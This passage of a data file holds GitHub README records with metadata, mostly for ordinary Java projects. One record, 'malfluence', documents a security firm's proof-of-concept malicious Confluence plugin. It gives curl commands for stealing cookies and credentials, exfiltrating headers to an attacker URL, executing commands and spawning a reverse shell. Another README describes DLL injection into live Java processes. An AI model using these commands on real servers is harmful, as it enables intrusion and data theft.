",0,0,3,0.0,"['intro', 'building', 'exploit', 'run', 'exploit', 'test', 'demonstration', 'reference']","['exploit', 'intro', 'building', 'run', 'test']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
Mark-Langston/Marks_Computer_Builds_Remote,master,"# Mark's Computer Builds - Remote

Mark's Computer Builds is a JavaFX application that allows users to manage and organize their computer builds. The application integrates with a remote PostgreSQL database to store and retrieve build information.

## Features

- Add, edit, and remove computer builds
- Secure login system
- Integration with a remote PostgreSQL database

## Video Demonstration

Watch a short demo of the project:

[![Mark's Computer Builds - Demo](https://img.youtube.com/vi/warFaJIbG7M/0.jpg)](https://youtu.be/warFaJIbG7M)

## Getting Started

### Prerequisites

- Java JDK 21
- PostgreSQL database
- Maven

### Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/Mark-Langston/Marks_Computer_Builds_Remote.git
    cd Marks_Computer_Builds_Remote
    ```

2. Set up the PostgreSQL database:
    - Create a new database and two tables using the following SQL commands:

    ```sql
    CREATE TABLE markscomputerbuilds (
        title TEXT PRIMARY KEY,
        case_type TEXT,
        motherboard TEXT,
        cpu TEXT,
        cpu_cooler TEXT,
        ram TEXT,
        gpu TEXT,
        power_supply TEXT,
        mass_storage TEXT
    );

    CREATE TABLE users (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL
    );

    -- Insert a sample user for testing
    INSERT INTO users (username, password) VALUES ('admin', '12345');
    ```

3. Update the `config.properties` file with your database credentials:
    ```properties
    remote.db.url=jdbc:postgresql://your_database_url:port/your_database_name
    remote.db.user=your_database_user
    remote.db.password=your_database_password
    ```

4. Build and run the application using Maven:
    ```sh
    mvn clean install
    mvn javafx:run
    ```

## Usage

1. Run the application.
2. Log in using the username and password set up in the PostgreSQL database.
3. Use the interface to add, edit, and remove computer builds.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request.
",0,0,1,0.0,"['mark', 'computer', 'build', 'remote', 'feature', 'video', 'demonstration', 'get', 'start', 'prerequisite', 'installation', 'usage', 'contribute']","['mark', 'computer', 'build', 'remote', 'feature']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.openjfx:javafx-maven-plugin]",0.0,1.0,0.0
0WhiteDev/Java-Process-Inspector,main,"# Java Process Inspector [JPI] ğŸ–¥ï¸

This is a sophisticated tool designed for dynamically browsing, analyzing, and modifying a running Java process âš¡

## Basic information

It allows users to interact with the Java application's live state, inspect its code, and make changes in real-time, offering a powerful solution for everyone, who need deep insights and control over Java applications during execution.

The program has a basic GUI that is easy to use and does not take up much memory.

## Functions

#### ğŸ”§ Dynamic Executor for Java Code: 
This feature allows you to force the program, to which JPI is attached, to execute specific lines of code written in the built-in code editor provided with JPI. It offers full access to use any classes and methods, enabling real-time manipulation and testing of the applicationâ€™s behavior.

#### âœï¸ Memory Editor: 
The Memory Editor is a powerful tool that enables you to search for specific values within the process's memory and dynamically modify them while the process is running. This function provides direct access to the internal state of the application, allowing precise and immediate adjustments.

#### ğŸ”Œ DLL Injector: 
A straightforward tool designed to inject DLL files into the process. This function simplifies the process of adding external libraries, enabling extended functionality or modifications to the running application.

#### ğŸ” Loaded Class Checker: 
This feature allows you to inspect all the classes loaded by the process, decompile them, and view their source code. Additionally, it provides the capability to dump all loaded classes to a specified folder.

#### ğŸ’» Process Profiler:
Real-time Java process monitoring and profiling solution. Displays performance metrics, resource utilization, process details and enables field inspection, providing a comprehensive overview of the running process.

## How to inject JPI
- To attach JPI to a java process, run Process Injector.exe
- Find the pid of the process you are interested in (java/javaw)
- Enter the pid of the process you want to attach JPI to (confirm with enter)
- Enter the full path to the dll file ""injector.dll"" (confirm with enter) `Example: C:\\Users\\whitedev\\Files\\injector.dll`

## Disclaimer
Remember that modifying memory, dynamically injecting new classes and various modifications in the running java process are quite dangerous and can cause various errors with your application, use this with caution.

## Project Suppot
If you need help, join to our community:
- Discord Server: https://discord.gg/KhExwvqZb5
- WebSite: https://devsmarket.eu/

## Authors

- [@0WhiteDev](https://github.com/0WhiteDev)
- [@DevsMarket](https://github.com/DEVS-MARKET)
",1,0,1,0.0,"['java', 'process', 'inspector', 'jpi', 'basic', 'information', 'function', 'dynamic', 'executor', 'java', 'code', 'memory', 'editor', 'dll', 'injector', 'loaded', 'class', 'checker', 'process', 'profiler', 'how', 'inject', 'jpi', 'disclaimer', 'project', 'suppot', 'author']","['java', 'process', 'jpi', 'inspector', 'basic']",1.0,[],0.0,1.0,0.0
cyllective/malfluence,main,"# Malfluence 
A PoC for a malicious Confluence plugin. Read more about this on [our blog](https://cyllective.com/blog/posts/atlassian-malicious-plugin/).

The general code may also work with slight adjustments in Jira but the plugin cannot be directly installed into Jira. 

## Features
### List & download attachments
```sh
curl ""http://yourserver/rest/maintenance/latest/listattachments?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getattachment?accesskey=<Access Key>&id=<Attachment ID>"" -O
```
![](media/attachments.png)

### List & download pages
```sh
curl ""http://yourserver/rest/maintenance/latest/listpages?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getpage?accesskey=<Access Key>&id=<Page ID>""
```
![](media/pages.png)

### Steal cookies
Since the cool cookies have HttpOnly set, this works by first sending a request to the custom endpoint `/getheaders`, which returns all headers base64 encoded into the DOM. Those are then sent to the attacker. 

```sh
# Configure the server which will receive POST requests of users containing base64 encoded headers
curl ""http://yourserver/rest/maintenance/latest/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}""
```

```sh
python3 headerserver.py
```
![](media/cookiesteal.gif)

### Steal credentials
```sh
python3 credsserver.py
```
![](media/credssteal.gif)

### Issue HTTP requests through the server
```sh
curl ""http://yourserver/rest/maintenance/latest/proxy?accesskey=<Access Key>&method={GET,POST}&url=<base64 encoded URL>&headers=<base64 encoded headers (name1:value1,nameN:valueN)>&body=<base64 encoded body for POST>""
```
![](media/proxy.png)

### Execute commands on the server
```sh
curl ""http://yourserver/rest/maintenance/latest/exec?accesskey=<Access Key>&cmd=<Command to run>&args=<arg1,arg2,arg3>""
```
![](media/exec.png)

### Spawn a reverse TCP shell
```sh
curl ""http://yourserver/rest/maintenance/latest/revshell?accesskey=<Access Key>&rhost=<Remote Host>&rport=<Remote Port>""
```
![](media/revshell.png)

### Scan for open ports on hosts reachable by the server
```sh
curl ""http://yourserver/rest/maintenance/latest/portscan?accesskey=<Access Key>&ip=<IP address>""
```
![](media/portscan.png)

### Hide plugins from the plugin overview
```sh
curl ""http://yourserver/rest/maintenance/latest/hideplugins?accesskey=<Access Key>&plugins=<com.plugin.hideme,com.plugin.hidemeto>&enabled={TRUE,FALSE}""
```
![](media/hideplugin.gif)",0,0,1,0.0,"['malfluence', 'feature', 'list', 'download', 'attachment', 'list', 'download', 'page', 'steal', 'cooky', 'configure', 'server', 'receive', 'post', 'request', 'user', 'contain', 'encode', 'header', 'steal', 'credential', 'issue', 'http', 'request', 'server', 'execute', 'command', 'server', 'spawn', 'reverse', 'tcp', 'shell', 'scan', 'open', 'port', 'host', 'reachable', 'server', 'hide', 'plugins', 'plugin', 'overview']","['server', 'list', 'download', 'steal', 'request']",2.0,"[com.atlassian.maven.plugins:confluence-maven-plugin,com.atlassian.plugin:atlassian-spring-scanner-maven-plugin]",0.0,0.0,0.0
niqumu/Irminsul,master,"<h1 align=""center"">Irminsul</h1>
<h4 align=""center"">An experimental anime game server implementation, written in Java.</h4>
<br>

![banner](https://github.com/user-attachments/assets/126e13fa-d6c0-4fc5-bfee-735b18b444bb)

Please avoid using the name of the game, game company, or notable content from the game when discussing this project.
This project contains no copyrighted works, and does not constitute copyright infringement. This code simply happens
to implement a certain protocol that some software may happen to support. This project is shared in hopes that it may
be interesting or helpful to people. I am not responsible for how people use this project.

## Credits
- The wonderful [Grasscutter](https://github.com/Grasscutters/Grasscutter) community for helping with protocol research
- Slushy team for their [Beach Simulator](https://github.com/SlushinPS/beach-simulator) protocol definitions
",0,0,1,0.0,['credit'],['credit'],5.0,[],0.0,4.0,1.0
Rapter1990/springbootmicroserviceswithsecurity,main,"# Spring Boot Microservices with JWT Implementation

<p align=""center"">
    <img src=""screenshots/spring_boot_microservices_jwt_implementation_main.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### ğŸ“– Information

<ul style=""list-style-type:disc"">
  <li>This project demonstrates a <b>Spring Boot microservices</b> architecture with <b>JWT-based authentication</b> and <b>role-based</b> access control. The setup includes an <b>API Gateway</b> to manage <b>routing</b> and <b>authentication</b>.</li> 
</ul>

<ul style=""list-style-type:disc"">
  <li>Roles and Permissions:
    <ul>
      <li><b>Admin</b> and <b>User</b> roles each have their own authentication and authorization mechanisms defined by their roles.</li>
      <li><b>Admin</b> can:
        <ul>
          <li>Create products</li>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
          <li>Update products by ID</li>
          <li>Delete products by ID</li>
        </ul>
      </li>
      <li><b>User</b> can:
        <ul>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/register</td>
      <td>Admin Register</td>
      <td>AdminRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/login</td>
      <td>Admin Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/refreshtoken</td>
      <td>Admin Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/logout</td>
      <td>Admin Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>UserRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refreshtoken</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Spring Cloud
- Postman
- Spring Security
- JWT

### Postman

```
Import postman collection under postman_collection folder
```


### Prerequisites

#### Define Variable in .env file for product service and user service

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd springbootmicroserviceswithsecurity
$ cd eurekaserver
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd apigateway
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd authservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd userservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd productservice
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityeurekaserver/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityapigateway/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityauthservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityuserservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityproductservice/general
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/eureka_server_image.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/docker_image.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/0_register_admin.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/0_login_admin.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/0_refresh_token_admin.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/0_logout_admin.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/2_register_user.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/2_login_user.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/2_refresh_token_user.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/2_logout_user.PNG"">
    <p> Figure 11 </p>
    <img src =""screenshots/3_create_product_by_user.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/1_get_product_by_admin.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/3_get_product_by_user.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/3_get_products_by_user.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/3_update_product_by_admin.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/3_delete_product_by_admin.PNG"">
</details>


### Contributors

- [Sercan Noyan GermiyanoÄŸlu](https://github.com/Rapter1990)",0,0,1,1.0,"['spring', 'boot', 'microservices', 'jwt', 'implementation', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'prerequisite', 'define', 'variable', 'file', 'product', 'service', 'user', 'service', 'docker', 'run', 'maven', 'run', 'docker', 'image', 'location', 'screenshots', 'contributor']","['service', 'docker', 'run', 'spring', 'boot']",5.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0
sculkmp/Sculk,main,"<div align=""center"">
<img src=""https://static.wikia.nocookie.net/minecraft_gamepedia/images/e/e2/Sculk_%28pre-release%29.png"" width=""150"" height=""150"" alt=""Logo Sculk"">
<h4>Open source server software for Minecraft: Bedrock Edition written in Java</h4>

[![SculkVersion](https://img.shields.io/badge/version-soon-14191E.svg?cacheSeconds=2592000)]()
[![MinecraftVersion](https://img.shields.io/badge/minecraft-v1.21.21%20(Bedrock)-17272F)]()
[![ProtocolVersion](https://img.shields.io/badge/protocol-712-38D3DF)]()
[![Github Download](https://img.shields.io/github/downloads/sculkmp/Sculk/total?label=downloads%40total)]()
[![License](https://img.shields.io/badge/License-LGPL--3-yellow.svg)]()
[![JitPack](https://jitpack.io/v/sculkmp/Sculk.svg)]()

</div>

## ğŸ“– Introduction
Sculk is open source server software for Minecraft: Bedrock Edition, It has a few key advantages over other server software:

## ğŸ¯ Features
* Written in Java, Sculk is faster and more stable.
* We provided a high-level friendly API akin PocketMine plugin developers. Save yourself the hassle of dealing with the dot-and-cross of the low-level system API and hooks, we've done the difficult part for you!

## âœ¨ Creating plugins
Add Sculk to your dependencies *(it is hosted by JitPack, so you need to specify a custom repository)*.

For maven:
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
<dependencies>
    <dependency>
        <groupId>com.github.sculkmp</groupId>
        <artifactId>Sculk</artifactId>
        <version>Tag</version>
    </dependency>
</dependencies>
```
For gradle:
```groovy
repositories {
    mavenCentral()
    maven { url 'https://jitpack.io' }
}
dependencies {
    implementation 'com.github.sculkmp:Sculk:Tag'
}
```

| Milestone                                | Status |
|------------------------------------------|--------|
| **âš’ï¸ Construction of the server tree**   | âœ…      |
| **ğŸ‘“ Visible server**                    | âœ…      |
| **ğŸ›œ Join server**                       | âœ…      |
| **ğŸ World loader**                      | ğŸš§     |
| **ğŸ”ŒPlugin loader**                      | â³      |
| **âŒ¨ï¸ Command System**                    | ğŸš§     |
| **ğŸ” Permission System**                 | ğŸš§     |
| **ğŸˆ Event System**                      | â³      |
| **ğŸ–¼ Scoreboard API**                    | ğŸš§     |
| **ğŸ–¼ Form API**                          | âœ…      |
| **ğŸ‘¤ Player & Actor API**                | â³      |
| **ğŸ”© Item API**                          | ğŸš§     |
| **ğŸ§± Block API**                         | ğŸš§     |
| **ğŸ“¦ Inventory API**                     | ğŸš§     |
| **ğŸ”¬ Beta Testing & Community Feedback** | ğŸš§     |
| **ğŸš€ Official Release & Support**        | ğŸš§     |

Here's a legend to guide you:
- âœ…: Task is completed. Woohoo! ğŸ‰
- ğŸš§: Task is under way. We're on it! ğŸ’ª
- â³: Task is up next. Exciting things are coming! ğŸŒ 

## âš’ï¸ Build JAR file
- `git clone https://github.com/sculkmp/Sculk`
- `cd Sculk`
- `git submodule update --init`
- `mvn clean package`
The compiled JAR can be found in the `target/` directory.

## ğŸš€ Running
Simply run `java -jar Sculk-1.0-SNAPSHOT-jar-with-dependencies.jar`

## ğŸ™Œ Contributing
We warmly welcome contributions to the Sculk project! If you are excited about improving Minecraft 
Bedrock server software with Java, here are some ways you can contribute:

### Reporting bugs
If you encounter any bugs while using Sculk, please open an [issue](https://github.com/sculkmp/Sculk/issues) in
our GitHub repository. Ensure to include a detailed description of the bug and steps to reproduce it.

### Submitting a Pull Request
We appreciate code contributions. If you've fixed a bug or implemented a new feature, please submit a pull request!
Please ensure your code follows our coding standards and include tests where possible.

## ğŸ“Œ Licensing information
This project is licensed under LGPL-3.0. Please see the [LICENSE](/LICENSE) file for details.

`sculkmp/Sculk` are not affiliated with Mojang. 
All brands and trademarks belong to their respective owners. Sculk is not a Mojang-approved software, 
nor is it associated with Mojang.",1,1,9,25.0,"['introduction', 'feature', 'creating', 'plugins', 'build', 'jar', 'file', 'run', 'contribute', 'report', 'bug', 'submit', 'pull', 'request', 'licensing', 'information']","['introduction', 'feature', 'creating', 'plugins', 'build']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
aws-samples/iceberg-streaming-examples,main,"# Streaming Apache Iceberg examples using Apache Spark
AWS Managed Kafka and Apache Kafka, a distributed event streaming platform, has become the de facto standard for building real-time data pipelines. However, ingesting and storing large amounts of streaming data in a scalable and performant manner can be complex and resource-intensive task, often leading to performance issues and increased costs.

This project covers  how open table formats, such as Apache Iceberg, can help address these challenges. It provides  a solution that combines the power of [Apache Kafka](https://kafka.apache.org/) , [Apache Spark](https://spark.apache.org/), and [Apache Iceberg](https://iceberg.apache.org/) to achieve high-throughput streaming ingestion

The focus in this repository is to go further than the typical poc consuming few messages or small csv files. The aim here is to provide support for around **400,000 msg/seg** on all scenarios. 

The concepts seen here are applicable to PySpark or Scala programs with little effort. Remember that we just program
the transformations and those are converted to a logical plan and then to native code via the Java Virtual Machine (JVM) or to native code using projects such as [Apache Data Fusion Comet](https://github.com/apache/datafusion-comet), [Velox](https://github.com/apache/datafusion-comet) or [Photon](https://www.databricks.com/product/photon).

Why Java? Because why not, remember that this nowadays gets executed by the JVM ( until previous projects arise). Remember that with this approach we can use libraries in an easy way ( without the Scala/Python/Java 'mess'), we can program performant UDFs and there is a friendly local development environment (where you can debug everything with breakpoints) with different options.

The example uses maven profiles to automatically filter required libraries when deployed to [Amazon EMR](https://aws.amazon.com/emr/) ( the Spark and Iceberg libraries will be marked as provided) and therefore you will be using the optimized Spark runtime from EMR. The logging is implemented using [Log4j2](https://logging.apache.org/log4j/2.12.x/) ( where its config can be further tuned using EMR Serverless configs) as Spark uses it behind the scenes. 

**Environment types:** 

- Local development using a [dockerized Kafka](https://github.com/bitnami/containers/blob/main/bitnami/kafka/).
- Local development against Amazon S3, and AWS Glue Catalog, here we will also use the dockerized Kafka.
- Production mode where we can deploy the code to an Amazon EMR Serverless cluster.

You can run these examples on any Spark compatible runtime too, but that's for a pull request ( if you like to contribute).

In the case of Amazon Web Services on AWS Glue, Amazon EMR or Amazon EMR Serverless.
Ã¦
Remember also that these jobs and code can be adapted for **batch mode** easily (and remember that you can use Kafka as batch source!). A batch job is just a special streaming job with a start and an end anyway.

### A note on performance

Although the code here aims for performance more tuning can be done for achieving specific goals such as improving latency.

Remember that Apache Iceberg have merge-on-read capabilities. In this repo, the default settings for tables are used
but mixing copy-on-write with merge-on-read can lead to some gains as we will write faster.

Remember that this is not a free lunch, you will need to compact if you want good performance.

Another cool thing to test is to use Avro for the ingestion tables and then compact to parquet. 

A good doc to read about these settings and more can be seen on the [Best Practices for Optimizing Apache Iceberg workloads](https://docs.aws.amazon.com/prescriptive-guidance/latest/apache-iceberg-on-aws/best-practices.html) from AWS Documentation.

Another good read can be seen on this blog from Cloudera: [Optimization Strategies for Iceberg Tables](https://blog.cloudera.com/optimization-strategies-for-iceberg-tables/)

## IoT Scenarios

Here we have different approaches and comÅ“mon formats. About the different scenarios the main idea is high throughput streaming
ingestion:
- Native Iceberg writing with deduplication via even-time watermarking.
- Custom process writing with compaction via n-batches and deduplication via merge into.
- Custom process writing with async compaction and Merge-on-read mode.

For the different formats we will have the native use case implemented and the ProtoBuf one will have all the scenarios.

The most advanced example using Protocol Buffers is in ```com.aws.emr.spark.iot``` package.

Later on a job rewriting older partitions to check for duplicates are found and rewrite affected partitions may run. 
An example of such approach can be seen also on the Utils class of ```com.aws.emr.spark.iot``` package.

Remember that exactly once systems are difficult to implement and that for Spark you will need and idempotent sink.

If you want to use the GlueSchemaRegistry you should create in the console a stream registry named ```employee-schema-registry```.

### Protocol Buffers

[Protocol Buffers](https://protobuf.dev/) are language-neutral, platform-neutral extensible mechanisms for serializing structured data.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 
- UDF based Spark Structured streaming consumer.

Create a schema for the Glue registry ```Employee.proto``` if you like to use the Registry based producer/consumer:

```
syntax = ""proto3"";
package gsr.proto.post;

import ""google/protobuf/wrappers.proto"";
import ""google/protobuf/timestamp.proto"";

message Employee {
      int32 id = 1;
      string name = 2;
      string address = 3;
      google.protobuf.Int32Value employee_age = 4;
      google.protobuf.Timestamp start_date = 5;
     Team team = 6;
     Role role = 7;

}
message Team {
     string name = 1;
     string location = 2;
}
enum Role {
     MANAGER = 0;
     DEVELOPER = 1;
     ARCHITECT = 2;
}
```

### Apache Avro

[Apache Avro](https://avro.apache.org/) - a data serialization system.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 

Create a schema for the Glue registry ```Employee.avsc``` if you like to use the Registry based producer/consumer:
```
{""namespace"": ""gsr.avro.post"",
 ""type"": ""record"",
 ""name"": ""Employee"",
 ""fields"": [
     {""name"": ""employee_id"", ""type"": ""long""},
     {""name"": ""age"",  ""type"": ""int""},
     {""name"": ""start_date"",   ""type"": ""long""},
   {""name"": ""team"", ""type"": ""string""},
   {""name"": ""role"", ""type"": ""string""},
   {""name"": ""address"", ""type"": ""string""},
   {""name"": ""name"", ""type"": ""string""}]
}
```

### Json

There is plenty of literature over the internet on how integrate Spark with Json data, therefore we just implemented one usecase.

**Examples**:
- AWS Glue Registry based Java Producer/Consumer.


Create a schema for the Glue registry ```Employee.json``` if you like to use the Registry based producer/consumer:
```
{
  ""$id"": ""https://example.com/Employee.schema.json"",
  ""$schema"": ""http://json-schema.org/draft-07/schema#"",
  ""title"": ""Employee"",
  ""description"": """",
  ""type"": ""object"",
  ""properties"": {
    ""employeeId"": {
      ""description"": ""The unique identifier for a employee"",
      ""type"": ""integer""
    },
    ""name"": {
      ""description"": ""Name of the employee"",
      ""type"": ""string""
    }
  }
}

```
## CDC Scenarios

Here the reference is Tabular [Apache Iceberg Cookbook](https://tabular.io/apache-iceberg-cookbook/) and these blogposts:
 - https://tabular.io/blog/hello-world-of-cdc/
 - https://tabular.io/blog/cdc-data-gremlins/#eventual-consistency-causes-data-gremlins
 - https://tabular.io/blog/cdc-merge-pattern/
 - https://tabular.io/blog/cdc-zen-art-of-cdc-performance/

Here we will focus on the Mirror MERGE patter, as stated in the Iceberg Cookbook the first part could be managed by 
the Kafka Connect Tabular connector, but we will implement both processing pipelines using Spark. 

The relevant classes are withing the ```com.aws.emr.spark.cdc``` package.  

 * ```KafkaCDCSimulator``` class is a Java producer simulating CDC data in [AWS Database Migration Service(DMS)](https://aws.amazon.com/es/dms/) format. 
 * ```SparkLogChange```  class is a Structured Streaming consumer that outputs a CDC changelog to an Iceberg table. 
 * ```SparkCDCMirror``` class is a Spark batch pipeline that process the MERGE using the Mirror approach.
 * ```SparkIncrementalPipeline``` class uses Incremental pipeline for consuming the CDC changelog into a target table. 

## Requirements

* Java 17 + ( you could adapt this code easily to run on Java 8 or Java 11)
* Maven 3.9+
* 16GB of RAM and more than 2 cores. 
* Whatever IDE you like ([Intellij](https://www.jetbrains.com/intellij/), [Visual Studio Code](https://code.visualstudio.com/), [NetBeans](https://apache.netbeans.org/), etc)

For local development and testing you can use the provided ```docker-compose.yml``` to spin up a Kafka cluster.

You can generate the description file using the protobuf compiler like this. You need to install the protobuf compiler for your system, for example on MacOs is available on ```brew```. 

```protoc --include_imports --descriptor_set_out=Employee.desc Employee.proto'```

Remember that for simple scenarios you will be better suited using [Kafka Connect Tabular Iceberg Connector](https://github.com/tabular-io/iceberg-kafka-connect/tree/main) or using [Amazon Kinesis Firehose](https://aws.amazon.com/firehose/).

### Running on EMR Serverless:

Create a S3 bucket with the following structure. 

```
s3bucket/
	/jars
	/employee.desc -- or your custom protocol buffers descriptors
	/warehouse
	/checkpoint
```

Package your application using the ```emr``` Maven profile, then upload the jar of the project to the ```jars``` folder. The ```warehouse``` will be the place where the Iceberg Data and Metadata will live and ```checkpoint``` will be used for Structured Streaming checkpointing mechanismn. 
 
Create a Database in the AWS Glue Data Catalog with the name ```bigdata```.

You need to create an EMR Serverless application with ```default settings for batch jobs only```, application type ```Spark``` release version ```7.2.0``` and ```x86_64``` as architecture, enable ```Java 17``` as runtime, enable ```AWS Glue Data Catalog as metastore```
integration and enable ```Cloudwatch logs``` if desired.

Then you can issue a job run using this aws cli command. Remember to change the desired parameters.

```
aws emr-serverless start-job-run     --application-id application-identifier     --name job-run-name     --execution-role-arn arn-of-emrserverless-role --mode 'STREAMING'     --job-driver
	'{
        ""sparkSubmit"": {
            ""entryPoint"": ""s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar"",
            ""entryPointArguments"": [""true"",""s3a://s3bucket/warehouse"",""/home/hadoop/Employee.desc"",""s3a://s3bucket/checkpoint"",""kafkaBootstrapString"",""true""],
            ""sparkSubmitParameters"": ""--class com.aws.emr.spark.iot.SparkCustomIcebergIngest --conf spark.executor.cores=4 --conf spark.hadoop.hive.metastore.client.factory.class=com.amazonaws.glue.catalog.metastore.AWSGlueDataCatalogHiveClientFactory --conf spark.executor.memory=16g  --conf spark.driver.cores=2 --conf spark.driver.memory=8g  --files s3a://s3bucket/Employee.desc --conf spark.dynamicAllocation.minExecutors=4 --conf spark.jars=/usr/share/aws/iceberg/lib/iceberg-spark3-runtime.jar --conf spark.emr-serverless.executor.disk.type=shuffle_optimized --packages org.apache.spark:spark-sql-kafka-0-10_2.12:3.5.1""
        }
    }'
{	
```

Expected performance should be around 450.000 msgs per sec if you use the ```SparkCustomIcebergIngest```.

<img src=""imgs/emr_performance.png"" align=""center"" height=""450"" width=""600""/>

You can also see the cluster autoscaling into action:

<img src=""imgs/emr_cluster_autoscaling.png"" align=""center"" height=""470"" width=""550""/>

### Running on a local environment.

1. Install a Java SDK 17 like [Amazon Coretto](https://aws.amazon.com/corretto/).
2. Install [Docker](https://www.docker.com/) for your environment. 
3. Open the desired IDE. 
4. Use the IDE to issue the ```package ``` command of maven selecting the local profile.
5. If you wish to use the AWS Glue Data Catalog and S3 remember to have the corresponding permissions (have your AWS credentials avaliable), there are plugins for both [Intellij](https://aws.amazon.com/intellij/?pg=developertools) and [Visual Studio Code](https://aws.amazon.com/visualstudiocode/) that can be helpful here.
6. Start the local Kafka broker via ```docker-compose up``` command.
7. Run the examples with the desired arguments, remember that you will need to add the required VM options for letting Spark to work on Java 17: 
```
